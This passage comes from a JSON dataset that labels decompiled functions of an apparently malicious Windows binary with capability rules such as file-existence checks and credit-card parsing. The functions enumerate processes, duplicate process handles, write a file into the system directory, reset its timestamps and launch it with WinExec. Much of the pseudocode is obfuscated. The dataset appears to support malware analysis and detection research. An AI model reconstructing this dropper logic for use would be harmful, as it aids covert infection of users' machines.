        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401646) overlaps instruction at (ram,0x00401641)\n// \n// WARNING: Removing unreachable block (ram,0x004015e4)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint64_t __cdecl fcn.00401380(uchar *arg_8h)\n\n{\n    uchar uVar1;\n    char cVar2;\n    uint16_t uVar3;\n    ushort *puVar4;\n    uint8_t uVar5;\n    uint16_t uVar6;\n    uint32_t in_EAX;\n    int32_t iVar7;\n    uint16_t *puVar8;\n    char *pcVar9;\n    uchar *puVar10;\n    uint32_t uVar11;\n    uint32_t in_ECX;\n    uint8_t uVar12;\n    uint32_t in_EDX;\n    int32_t unaff_EBX;\n    uint32_t uVar13;\n    uint unaff_EBP;\n    ushort *puVar14;\n    uint32_t unaff_ESI;\n    uchar *puVar15;\n    uchar *unaff_EDI;\n    uint32_t *puVar16;\n    uint32_t *puVar17;\n    bool in_CF;\n    bool bVar18;\n    uint8_t in_AF;\n    bool in_ZF;\n    bool bVar19;\n    bool in_OF;\n    float10 in_ST0;\n    float10 in_ST1;\n    float10 in_ST2;\n    float10 in_ST3;\n    float10 in_ST4;\n    float10 in_ST5;\n    float10 in_ST6;\n    float10 in_ST7;\n    ulong uVar20;\n    ushort unaff_retaddr;\n    uint16_t uStack22;\n    ushort uStack16;\n    uint8_t uStack14;\n    uint8_t uStack13;\n    uint16_t uStack12;\n    uint16_t uStack10;\n    ushort uStack8;\n    uint16_t uStack6;\n    ushort uStack4;\n    ushort uStack2;\n    \n    puVar14 = &uStack4;\n    uStack4 = unaff_EBP;\n    uStack2 = unaff_EBP >> 0x10;\n    uStack8 = unaff_EBX;\n    uStack6 = unaff_EBX >> 0x10;\n    uStack10 = unaff_ESI >> 0x10;\n    uStack16 = SUB42(unaff_EDI, 0);\n    if ((in_OF) || (!in_OF)) {\n        uVar20 = (*_sym.imp.MSVCRT.dll__access)(arg_8h, 0);\n        in_EDX = uVar20 >> 0x20;\n        iVar7 = uVar20;\n    }\n    else {\n        uVar1 = in(in_EDX);\n        *unaff_EDI = uVar1;\n        uVar11 = CONCAT31(unaff_EBX >> 8, 0xbc);\n        if (!in_CF && !in_ZF) {\n            puVar16 = CONCAT22(uStack8, uStack10);\n            *(uVar11 + 2) = 0xd0;\n            if ((!in_CF) && (puVar16 = unaff_EBX << 0x10 | uStack10,  in_CF)) {\n                func_0x101873a7();\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            *(uVar11 + 3) = 0x54;\n            *(uVar11 + 4) = 0x55;\n            uStack14 = in_ECX;\n            uVar12 = uStack14;\n            uVar11 = uVar11 & 0xffff | uStack6 << 0x10;\n            arg_8h[5] = 0x99;\n            bVar18 = (POPCOUNT(uStack14 - 1) & 1U) != 0;\n            puVar8 = in_EAX & 0xffff0000 | unaff_ESI & 0xffff;\n            arg_8h[6] = 0x25;\n            if ((bVar18) && (puVar4 = &uStack4,  !bVar18)) goto code_r0x00401497;\n            arg_8h[7] = 0xec;\n            pcVar9 = puVar8;\ncode_r0x0040149c:\n            do {\n                puVar8 = &uStack6;\n                arg_8h[8] = 5;\n                uStack14 = uVar11;\n                uStack13 = uVar11 >> 8;\n                uStack12 = uVar11 >> 0x10;\n                uVar13 = uVar11 + 1;\n                bVar18 = (POPCOUNT(uVar13 & 0xff) & 1U) != 0;\n                arg_8h[9] = 0x5b;\n                puVar15 = arg_8h;\n                if ((uVar13 != 0) && (uVar13 == 0)) {\n                    pcVar9 = pcVar9 & 0xffffff00 | *0x4bb148d3;\n                    puVar15 = arg_8h + 1;\n                    out(*arg_8h, uStack16);\n                }\n                puVar15[10] = 0xa9;\n                uVar5 = pcVar9 >> 8;\n                uStack22 = uVar11;\n                uVar3 = uStack22;\n                puVar10 = puVar15;\n                if ((bVar18) && (!bVar18)) {\n                    puVar10 = *puVar16;\n                    *puVar16 = puVar15;\n                    puVar14 = puVar14 + -*(puVar14 + 0x5f9dff63);\n                    if (puVar14 < 0) {\n                        arg_8h = puVar10 + 1;\n                        puVar4 = puVar14;\ncode_r0x00401497:\n                        puVar14 = puVar4;\n                        arg_8h = arg_8h + 0x46;\n                        uVar5 = in(uStack16);\n                        pcVar9 = puVar8 & 0xffffff00 | uVar5;\n                        goto code_r0x0040149c;\n                    }\n                    if (-1 < puVar10) {\n                        *puVar16 = in_ST0;\n                        *pcVar9 = *pcVar9 + pcVar9;\n                        pcVar9[0x4bb148d3] = pcVar9[0x4bb148d3] + uVar5;\n                        arg_8h = puVar10;\n                        in_ST0 = in_ST1;\n                        in_ST1 = in_ST2;\n                        in_ST2 = in_ST3;\n                        in_ST3 = in_ST4;\n                        in_ST4 = in_ST5;\n                        in_ST5 = in_ST6;\n                        in_ST6 = in_ST7;\n                        goto code_r0x00401570;\n                    }\n                }\n                puVar10[0xb] = 0x40;\n                uStack10 = pcVar9;\n                uStack8 = pcVar9 >> 0x10;\n                cVar2 = (uStack13 ^ 0x16 | uVar5) - (unaff_EDI >> 8);\n                bVar19 = cVar2 == '\\0';\n                bVar18 = (POPCOUNT(cVar2) & 1U) == 0;\n                puVar10[0xc] = 0xaa;\n                arg_8h = puVar10;\n                if ((bVar18) || (!bVar18)) goto code_r0x00401555;\n                arg_8h = *puVar16;\n                *puVar16 = puVar10;\n                puVar14 = puVar14 + -*(puVar14 + 0x5f9dff63);\n                if (-1 < puVar14) {\n                    bVar19 = arg_8h == NULL;\n                    if (arg_8h < 0) {\ncode_r0x00401555:\n                        arg_8h[0xd] = 0xce;\n                        puVar15 = arg_8h;\n                        if ((!bVar19) && (bVar19)) {\ncode_r0x00401570:\n                            puVar15 = arg_8h + 1;\n                            out(*arg_8h, uStack16);\n                        }\n                        puVar15[0xe] = 0x68;\n                        pcVar9 = *(puVar14 + 8);\n                        pcVar9[0xf] = -5;\n                        uStack10 = pcVar9;\n                        uStack8 = pcVar9 >> 0x10;\n                        puVar16 = *(puVar14 + 8);\n                        *(puVar16 + 4) = 0xcc;\n                    }\n                    uVar6 = CONCAT11(((pcVar9 >> 8) - uStack14) + 'M', pcVar9) & 0x26ae;\n                    uVar11 = CONCAT22(uStack8, uStack10);\n                    *(puVar16 + 0x11) = 0xac;\n                    puVar17 = puVar16;\n                    if ((uVar6 != 0) && (uVar6 == 0)) {\n                        out(0xc4, uVar11);\n                        unaff_EDI = unaff_EDI & 0xffffff00 | unaff_EDI ^ uVar12;\n                        puVar17 = puVar16 + 1;\n                        *puVar16 = uVar11;\n                    }\n                    *(puVar17 + 0x12) = 0x42;\n                    uStack22 = in_ECX >> 0x10;\n                    while( true ) {\n                        bVar18 = -1 < uVar11 + -1;\n                        uVar13 = uStack22;\n                        puVar15 = uVar11 & 0xffff0000 | uStack10;\n                        *(puVar17 + 0x13) = 0x4f;\n                        if ((bVar18) && (!bVar18)) {\n                            *(puVar17 + 7) = in_ST0;\n                            puVar17 = puVar17 + 5;\n                            in_ST0 = in_ST1;\n                            in_ST1 = in_ST2;\n                            in_ST2 = in_ST3;\n                            in_ST3 = in_ST4;\n                            in_ST4 = in_ST5;\n                            in_ST5 = in_ST6;\n                            in_ST6 = in_ST7;\n                        }\n                        *(puVar17 + 5) = 0x68;\n                        bVar18 = (POPCOUNT((uStack13 ^ 0x16 | uStack10 >> 8) - (unaff_EDI >> 8)) & 1U) == 0;\n                        *(puVar17 + 0x15) = 0x4e;\n                        if ((bVar18) || (!bVar18)) {\n                            *(puVar17 + 0x16) = 0x3f;\n                            puVar10 = puVar15;\n                        }\n                        else {\n                            puVar10 = unaff_EDI + 1;\n                            puVar14 = *0xc617b43a;\n                            puVar17 = puVar17 + 1;\n                            in_AF = 9 < (puVar10 & 0xf) | in_AF;\n                            puVar10 = puVar10 & 0xffff0000 |\n                                      CONCAT11((puVar10 >> 8) - in_AF, puVar10 + in_AF * -6) & 0xff0f;\n                            unaff_EDI = puVar15;\n                        }\n                        uVar12 = unaff_EDI ^ uStack13 | 0x67;\n                        *(puVar17 + 0x17) = 0xf5;\n                        if ((uVar12 < '\\x01') || ('\\0' < uVar12)) break;\n                        in_AF = 9 < (puVar10 & 0xf) | in_AF;\n                        uVar11 = (puVar10 & 0xffffff00 | puVar10 + in_AF * '\\x06') & 0xffff000f;\n                        uStack22 = uVar3;\n                        uStack10 = uStack12;\n                        if ((in_ECX & 0xffff | uVar13 << 0x10) != 0) {\n                            do {\n    // WARNING: Do nothing block with infinite loop\n                            } while( true );\n                        }\n                    }\n                    **(puVar14 + 0xc) = 0x18;\n                    return CONCAT44(unaff_EDI, puVar10);\n                }\n                uVar11 = CONCAT22(unaff_retaddr, uStack2);\n            } while( true );\n        }\n        bVar18 = CARRY1(*0x6a08458a, in_EDX);\n        *0x6a08458a = *0x6a08458a + in_EDX;\n        iVar7 = bVar18 + 0x6a48a68f;\n    }\n    if (iVar7 != -1) {\n        return in_EDX << 0x20;\n    }\n    return CONCAT44(in_EDX, 1);\n}\n",
        "token_count": 2853
    },
    "00402810": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402868)\n\nuint __cdecl fcn.00402810(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_108h;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    iVar2 = (**0x4235e0)(2, 0);\n    if (iVar2 == -1) {\n        return 0xffffffff;\n    }\n    var_12ch = 0x128;\n    puVar4 = &var_128h;\n    for (iVar3 = 0x49; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    iVar3 = (**0x4235e4)(iVar2, &var_12ch);\n    pcVar1 = _sym.imp.MSVCRT.dll__stricmp;\n    do {\n        if (iVar3 == 0) {\ncode_r0x004028e9:\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n            return var_4h;\n        }\n        iVar3 = (*pcVar1)(&var_108h, arg_8h);\n        if (iVar3 == 0) {\n            var_4h = var_124h;\n            goto code_r0x004028e9;\n        }\n        iVar3 = (**0x4235e8)(iVar2, &var_12ch);\n    } while( true );\n}\n",
        "token_count": 379
    },
    "004029e0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402a54)\n\nbool fcn.004029e0(void)\n\n{\n    int32_t iVar1;\n    uint var_10ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0x104;\n    if ((!SBORROW4(&stack0xfffffffc, 0x10c)) && (SBORROW4(&stack0xfffffffc, 0x10c))) {\n        LOCK();\n    }\n    iVar1 = fcn.00403130(0x80000002, 0x423414, 0x423454, &var_8h, &var_10ch, &var_4h);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.MSVCRT.dll__access)(&var_10ch, 0);\n        return iVar1 != -1;\n    }\n    return false;\n}\n",
        "token_count": 208
    },
    "00402de0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402ea0)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00402de0(uint arg_8h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *unaff_EDI;\n    ushort in_SS;\n    bool in_CF;\n    bool in_PF;\n    uchar in_OF;\n    uint in_stack_00000008;\n    uint var_4h;\n    \n    if ((in_PF) || (!in_PF)) {\ncode_r0x00402e0b:\n        iVar2 = fcn.00402810(0x4231a0);\n        in_OF = SBORROW4(iVar2, -1);\n        if (iVar2 == -1) {\n            return 0;\n        }\n        if (in_OF) goto code_r0x00402e46;\n    }\n    else {\n        puVar1 = segment(in_SS, *0x10 + -0x14);\n        if (!in_CF) {\n            if (in_PF) {\n                return *puVar1;\n            }\n            unaff_EDI = 0xb7bc9ea5;\n            goto code_r0x00402e0b;\n        }\n    }\n    if (in_OF) {\n        *unaff_EDI = in_stack_00000008;\n        return in_stack_00000008;\n    }\ncode_r0x00402e46:\n    iVar2 = (*_sym.imp.KERNEL32.dll_OpenProcess)();\n    if (iVar2 == 0) {\n        return 0;\n    }\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(arg_8h, iVar2, 0, 0, 0, 2);\n    iVar4 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar3);\n    if (iVar4 != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 455
    },
    "00402ed0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402f9b) overlaps instruction at (ram,0x00402f97)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00402ed0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t arg_ch_00;\n    int32_t iVar1;\n    uint32_t *puVar2;\n    int32_t iStack68;\n    uint uStack64;\n    uint uStack60;\n    uint *puStack56;\n    uint var_4h;\n    \n    *0x4235d8 = fcn.004029e0();\n    arg_ch_00 = (*_sym.imp.KERNEL32.dll_CreateFileA)();\n    if (arg_ch_00 == -1) {\n        return 0;\n    }\n    uStack60 = arg_10h;\n    uStack64 = arg_ch;\n    puStack56 = &var_4h;\n    iStack68 = arg_ch_00;\n    iVar1 = (*_sym.imp.KERNEL32.dll_WriteFile)();\n    if (iVar1 != 0) {\n        iVar1 = arg_ch_00;\n        if (*0x4235d8 == 0) goto code_r0x00402fb3;\n        while( true ) {\n            iVar1 = fcn.00402de0(iVar1);\n            *0x4235d8 = iVar1 == 0;\ncode_r0x00402fb3:\n            puVar2 = fcn.00404ec0(0, arg_ch_00);\n            if ((0xfffffff7 < &stack0xffffffb4) || (0xfffffff7 >= &stack0xffffffb4)) break;\n            iVar1 = -0x48073f75;\n            if (&iStack68 < *puVar2 || puVar2 == 0xffffffff) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n        }\n        if (*0x4235d8 == 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)();\n        }\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 487
    },
    "00404320": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404338)\n// WARNING: Removing unreachable block (ram,0x00404342)\n\nuint fcn.00404320(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00404760(0x423134);\n    if (iVar1 == -1) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n    return 1;\n}\n",
        "token_count": 103
    },
    "00404830": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404a81) overlaps instruction at (ram,0x00404a80)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x0040498a)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl fcn.00404830(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t uVar1;\n    uint8_t extraout_CH;\n    int32_t iVar2;\n    uint *puVar3;\n    bool bVar4;\n    ulong uVar5;\n    uint var_213h;\n    uchar s;\n    uint var_10fh;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar3 = &var_213h;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    s = 0;\n    puVar3 = &var_10fh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    var_ch = 1;\n    *(puVar3 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)();\n    fcn.00401680(&var_4h, &var_8h);\n    iVar2 = fcn.00402bd0(arg_8h, arg_ch, arg_10h, arg_14h, var_4h, var_8h);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    uVar5 = fcn.00402ed0(&s, var_4h, var_8h);\n    uVar1 = uVar5;\n    if (uVar1 == 0) {\n        return 0;\n    }\n    bVar4 = -1 < ((uVar5 >> 0x20 & 0xffffff00 | extraout_CH) & uVar1);\n    if ((bVar4) && (!bVar4)) {\n        out(0xc4, uVar1);\n        *(puVar3 + 3) = uVar1;\n    }\n    fcn.00402d40();\n    // WARNING: Bad instruction - Truncating control flow here\n    iVar2 = fcn.00402810(0x42318c);\n    if ((iVar2 != -1) || (iVar2 = fcn.00402810(0x423180),  iVar2 != -1)) {\n        iVar2 = fcn.00404540(arg_8h);\n        if (iVar2 != 0) {\n            fcn.004031f0();\n            fcn.00403120();\n            return 1;\n        }\n        if (*0x4235d8 == 0) {\n            return 0;\n        }\n    }\n    iVar2 = fcn.004044b0(arg_8h, &s);\n    if (iVar2 == 0) {\n        var_ch = 0;\n    }\n    if ((var_ch != 0) && (iVar2 = fcn.00401710(),  iVar2 == 0)) {\n        var_ch = 0;\n    }\n    iVar2 = func_0x1018a9f3();\n    if ((*(iVar2 + -0x7f + arg_ch) & 0x4b) == 0) {\n        var_ch = fcn.004045e0(arg_8h + -1, 0);\n    }\n    if (var_ch != 0) {\n        fcn.00403120();\n    }\n    (*_sym.imp.KERNEL32.dll_Sleep)();\n    (*_sym.imp.KERNEL32.dll_WinExec)(0x4231a0, 0);\n    return var_ch;\n}\n",
        "token_count": 948
    },
    "00404d10": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404e78) overlaps instruction at (ram,0x00404e74)\n// \n// WARNING: Removing unreachable block (ram,0x00404e69)\n// WARNING: Removing unreachable block (ram,0x00404e6b)\n// WARNING: Removing unreachable block (ram,0x00404e7a)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint32_t fcn.00404d10(uint param_1, int32_t param_2, uint param_3, uint param_4, int32_t param_5, uint param_6, \n                     int32_t param_7)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    char *pcVar7;\n    char *pcVar8;\n    uint *puVar9;\n    char in_AF;\n    bool bVar10;\n    char acStackY564 [236];\n    uint uStackY328;\n    int32_t iStackY324;\n    int32_t iStackY320;\n    uchar *puStackY316;\n    uchar *puStackY312;\n    uchar uStack272;\n    uchar auStack271 [7];\n    uchar auStack264 [224];\n    uchar auStack40 [8];\n    uchar auStack32 [20];\n    uchar auStack12 [4];\n    int32_t iStack8;\n    \n    puStackY316 = &stack0xfffffffc;\n    fcn.00401780(param_5, param_6, param_1, 0x20, param_7 + 0x20);\n    fcn.00401780(param_5, param_6, param_2, 0x20, param_7 + 0x60);\n    fcn.00401780(param_5, param_6, param_3, 0x20, param_7 + 0xa0);\n    fcn.00401780(param_5, param_6, param_4, 0x20, param_7 + 0xe0);\n    iVar2 = fcn.00404cc0();\n    if (iVar2 == -1) {\n        iVar2 = (*_sym.imp.MSVCRT.dll_rand)();\n        *(param_7 + 0x120) = iVar2 % 5;\n    }\n    else {\n        *(param_7 + 0x120) = iVar2;\n    }\n    uStack272 = 0;\n    puVar5 = &stack0xfffffef1;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    iStack8 = 0x104;\n    *(puVar5 + 2) = 0;\n    puStackY312 = 0x404e58;\n    uVar3 = fcn.00403130(0x80000001, 0x42337c, 0x4233a8, &stack0xfffffff4, &stack0xfffffef0, &stack0xfffffff8);\n    if (uVar3 != 0) {\n        uVar3 = (*_sym.imp.MSVCRT.dll__stricmp)();\n        bVar10 = uVar3 == 0;\n        if (bVar10) {\n            if ((!bVar10) && (bVar10)) {\n                if (param_5 + 1 == 0) {\n                    *(puVar5 + 3) = 0;\n                    *(puVar5 + 7) = 0;\n                    puVar5 = &stack0xfffffed1;\n                    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n                        *puVar5 = 0;\n                        puVar5 = puVar5 + 1;\n                    }\n                    *puVar5 = 0;\n                    iStackY324 = puVar5 + 3;\n                    *(puVar5 + 2) = 0;\n                    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n                    iStackY320 = param_7;\n                    uVar3 = 0xffffffff;\n                    pcVar7 = &stack0xfffffdcc;\n                    do {\n                        pcVar6 = pcVar7;\n                        if (uVar3 == 0) break;\n                        uVar3 = uVar3 - 1;\n                        pcVar6 = pcVar7 + 1;\n                        cVar1 = *pcVar7;\n                        pcVar7 = pcVar6;\n                    } while (cVar1 != '\\0');\n                    uVar3 = ~uVar3;\n                    puVar5 = pcVar6 + -uVar3;\n                    puVar9 = &stack0xfffffed0;\n                    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n                        *puVar9 = *puVar5;\n                        puVar5 = puVar5 + 1;\n                        puVar9 = puVar9 + 1;\n                    }\n                    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n                        *puVar9 = *puVar5;\n                        puVar5 = puVar5 + 1;\n                        puVar9 = puVar9 + 1;\n                    }\n                    uVar3 = 0xffffffff;\n                    pcVar7 = 0x42316c;\n                    do {\n                        pcVar6 = pcVar7;\n                        if (uVar3 == 0) break;\n                        uVar3 = uVar3 - 1;\n                        pcVar6 = pcVar7 + 1;\n                        cVar1 = *pcVar7;\n                        pcVar7 = pcVar6;\n                    } while (cVar1 != '\\0');\n                    uVar3 = ~uVar3;\n                    iVar2 = -1;\n                    pcVar7 = &stack0xfffffed0;\n                    do {\n                        pcVar8 = pcVar7;\n                        if (iVar2 == 0) break;\n                        iVar2 = iVar2 + -1;\n                        pcVar8 = pcVar7 + 1;\n                        cVar1 = *pcVar7;\n                        pcVar7 = pcVar8;\n                    } while (cVar1 != '\\0');\n                    puVar5 = pcVar6 + -uVar3;\n                    puVar9 = pcVar8 + -1;\n                    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n                        *puVar9 = *puVar5;\n                        puVar5 = puVar5 + 1;\n                        puVar9 = puVar9 + 1;\n                    }\n                    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n                        *puVar9 = *puVar5;\n                        puVar5 = puVar5 + 1;\n                        puVar9 = puVar9 + 1;\n                    }\n                    puStackY312 = &stack0xfffffedc;\n                    (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)();\n                    iVar2 = iStack8;\n                    if (param_2 == -1) {\n                        puStackY312 = 0x404fc5;\n                        iVar2 = fcn.00404760(param_1);\n                        if (iVar2 == -1) {\n                            pe_dos_header = pe_dos_header & 0xc3;\n                            return 0;\n                        }\n                    }\n                    puStackY312 = &stack0xffffffe0;\n                    puStackY316 = &stack0xffffffd8;\n                    iStackY324 = 0x404ff6;\n                    iStackY320 = iVar2;\n                    (*_sym.imp.KERNEL32.dll_SetFileTime)();\n                    if (param_2 == -1) {\n                        uStackY328 = 0x405002;\n                        iStackY324 = iVar2;\n                        (*_sym.imp.KERNEL32.dll_CloseHandle)();\n                    }\n                    pe_dos_header = pe_dos_header & 0xc3;\n                    return 1;\n                }\n                uVar3 = CONCAT11(in_AF, in_AF * '\\x06') & 0xff0f;\n                *(uVar3 + 0x2a) = *(uVar3 + 0x2a) - (param_5 + 1);\n                param_7 = param_7 + 1;\n            }\n            *(param_7 + 0x120) = *(param_7 + 0x120) | 0x80;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 1937
    },
    "004013e0": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681",
            "parse credit card information/0fcc6283562247e58776c7b51a92f681",
            "parse credit card information/0fcc6283562247e58776c7b51a92f681",
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401646) overlaps instruction at (ram,0x00401641)\n// \n// WARNING: Removing unreachable block (ram,0x004015e4)\n// WARNING: Removing unreachable block (ram,0x00401425)\n\nvoid __fastcall fcn.004013e0(uint32_t param_1, uint16_t param_2, uchar *param_3)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    uint16_t uVar5;\n    uint32_t in_EAX;\n    char *pcVar6;\n    char *pcVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uchar *puVar11;\n    uchar *puVar12;\n    uchar *unaff_ESI;\n    uchar *puVar13;\n    uchar *puVar14;\n    uint32_t *unaff_EDI;\n    uint32_t *puVar15;\n    bool bVar16;\n    uint8_t in_AF;\n    bool bVar17;\n    float10 in_ST0;\n    float10 in_ST1;\n    float10 in_ST2;\n    float10 in_ST3;\n    float10 in_ST4;\n    float10 in_ST5;\n    float10 in_ST6;\n    float10 in_ST7;\n    uint16_t uStack32;\n    uint16_t uStack30;\n    uint16_t uStack20;\n    ushort uStack18;\n    \n    puVar12 = &stack0xfffffffc;\n    *param_3 = 0xd6;\n    param_3[1] = 0x86;\n    param_3[2] = 0xd0;\n    param_3[3] = 0x54;\n    param_3[4] = 0x55;\n    uVar10 = param_2;\n    param_3[5] = 0x99;\n    bVar16 = (POPCOUNT(param_1 - 1) & 1U) != 0;\n    pcVar6 = (in_EAX >> 8 & 0xffff00) << 8 | in_EAX & 0xffff;\n    param_3[6] = 0x25;\n    if ((bVar16) && (puVar14 = &stack0xfffffffc,  puVar11 = param_3,  !bVar16)) goto code_r0x00401497;\n    param_3[7] = 0xec;\n    pcVar7 = pcVar6;\n    puVar13 = param_3;\n    puVar14 = param_3;\ncode_r0x0040149c:\n    do {\n        pcVar6 = &stack0xfffffff0;\n        param_3 = puVar13;\n        puVar14[8] = 5;\n        puVar11 = param_3 + 1;\n        bVar16 = (POPCOUNT(puVar11 & 0xff) & 1U) != 0;\n        puVar14[9] = 0x5b;\n        puVar13 = puVar14;\n        if ((puVar11 != NULL) && (puVar11 == NULL)) {\n            pcVar7 = pcVar7 & 0xffffff00 | *0x4bb148d3;\n            puVar13 = puVar14 + 1;\n            out(*puVar14, param_2);\n        }\n        puVar13[10] = 0xa9;\n        uVar4 = pcVar7 >> 8;\n        uVar3 = param_3 >> 8;\n        puVar11 = puVar13;\n        if ((bVar16) && (!bVar16)) {\n            puVar11 = *unaff_EDI;\n            *unaff_EDI = puVar13;\n            puVar12 = puVar12 + -*(puVar12 + 0x5f9dff63);\n            if (puVar12 < 0) {\n                puVar11 = puVar11 + 1;\n                puVar14 = puVar12;\ncode_r0x00401497:\n                puVar12 = puVar14;\n                uVar3 = in(param_2);\n                pcVar7 = pcVar6 & 0xffffff00 | uVar3;\n                puVar13 = param_3;\n                puVar14 = puVar11 + 0x46;\n                goto code_r0x0040149c;\n            }\n            if (-1 < puVar11) {\n                *unaff_EDI = in_ST0;\n                *pcVar7 = *pcVar7 + pcVar7;\n                pcVar7[0x4bb148d3] = pcVar7[0x4bb148d3] + uVar4;\n                puVar14 = puVar11;\n                in_ST0 = in_ST1;\n                in_ST1 = in_ST2;\n                in_ST2 = in_ST3;\n                in_ST3 = in_ST4;\n                in_ST4 = in_ST5;\n                in_ST5 = in_ST6;\n                in_ST6 = in_ST7;\n                goto code_r0x00401570;\n            }\n        }\n        puVar11[0xb] = 0x40;\n        uStack20 = pcVar7;\n        uStack18 = pcVar7 >> 0x10;\n        cVar1 = (uVar3 ^ 0x16 | uVar4) - (uVar10 >> 8);\n        bVar17 = cVar1 == '\\0';\n        bVar16 = (POPCOUNT(cVar1) & 1U) == 0;\n        puVar11[0xc] = 0xaa;\n        puVar14 = puVar11;\n        if ((bVar16) || (!bVar16)) goto code_r0x00401555;\n        puVar14 = *unaff_EDI;\n        *unaff_EDI = puVar11;\n        puVar12 = puVar12 + -*(puVar12 + 0x5f9dff63);\n        puVar13 = unaff_ESI;\n        if (-1 < puVar12) {\n            bVar17 = puVar14 == NULL;\n            if (puVar14 < 0) {\ncode_r0x00401555:\n                puVar14[0xd] = 0xce;\n                puVar11 = puVar14;\n                if ((!bVar17) && (bVar17)) {\ncode_r0x00401570:\n                    puVar11 = puVar14 + 1;\n                    out(*puVar14, param_2);\n                }\n                puVar11[0xe] = 0x68;\n                pcVar7 = *(puVar12 + 8);\n                pcVar7[0xf] = -5;\n                unaff_EDI = *(puVar12 + 8);\n                *(unaff_EDI + 4) = 0xcc;\n                uStack20 = pcVar7;\n                uStack18 = pcVar7 >> 0x10;\n            }\n            uVar5 = CONCAT11(((pcVar7 >> 8) - param_3) + 'M', pcVar7) & 0x26ae;\n            uVar9 = CONCAT22(uStack18, uStack20);\n            *(unaff_EDI + 